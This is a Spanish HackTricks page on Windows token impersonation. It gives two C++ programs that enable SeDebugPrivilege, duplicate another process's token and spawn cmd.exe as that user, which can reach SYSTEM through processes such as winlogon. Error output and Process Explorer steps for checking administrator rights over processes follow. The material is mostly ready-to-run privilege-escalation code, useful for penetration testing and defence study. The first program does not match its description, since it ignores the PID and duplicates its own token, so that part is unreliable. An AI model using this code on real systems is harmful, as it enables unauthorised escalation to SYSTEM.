<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


## Código

El siguiente código fue copiado de [aquí](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962).
Permite **indicar un ID de proceso como argumento** y se ejecutará un CMD **ejecutándose como el usuario** del proceso indicado.\
Ejecutándose en un proceso de alta integridad, se puede **indicar el PID de un proceso que se esté ejecutando como System** (como winlogon, wininit) y ejecutar un cmd.exe como System.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>

BOOL ImpersonateSystem()
{
    HANDLE hToken;
    BOOL result = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        {
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
            {
                HANDLE hNewToken;

                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
                {
                    PROCESS_INFORMATION pi;
                    STARTUPINFO si;
                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);

                    if (CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
                    {
                        result = TRUE;
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }

                    CloseHandle(hNewToken);
                }
            }
        }

        CloseHandle(hToken);
    }

    return result;
}

int main()
{
    if (ImpersonateSystem())
    {
        printf("Success!\n");
    }
    else
    {
        printf("Failed!\n");
    }

    return 0;
}
```
{% endcode %}
```cpp
#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}
std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}
int main(int argc, char** argv) {
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());
	// Grab PID from command line argument
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}
	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}
	return 0;
}
```
{% endcode %}

## Error

En algunas ocasiones, puede intentar hacerse pasar por System y no funcionará, mostrando una salida como la siguiente:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Esto significa que incluso si estás ejecutando en un nivel de integridad alto, no tienes suficientes permisos. 

Veamos los permisos actuales del Administrador sobre los procesos `svchost.exe` con **Process Explorer** (o también puedes usar Process Hacker):

1. Selecciona un proceso de `svchost.exe`
2. Haz clic derecho --> Propiedades
3. Dentro de la pestaña "Seguridad", haz clic en el botón "Permisos" en la esquina inferior derecha
4. Haz clic en "Avanzado"
5. Selecciona "Administradores" y haz clic en "Editar"
6. Haz clic en "Mostrar permisos avanzados"

La imagen anterior contiene todos los privilegios que "Administradores" tienen sobre el proceso seleccionado (como se puede ver en el caso de `svchost.exe`, solo tienen privilegios de "Consulta").

Mira los privilegios que "Administradores" tienen sobre `winlogon.exe`:

Dentro de ese proceso, "Administradores" pueden "Leer memoria" y "Leer permisos", lo que probablemente les permita suplantar el token utilizado por este proceso.
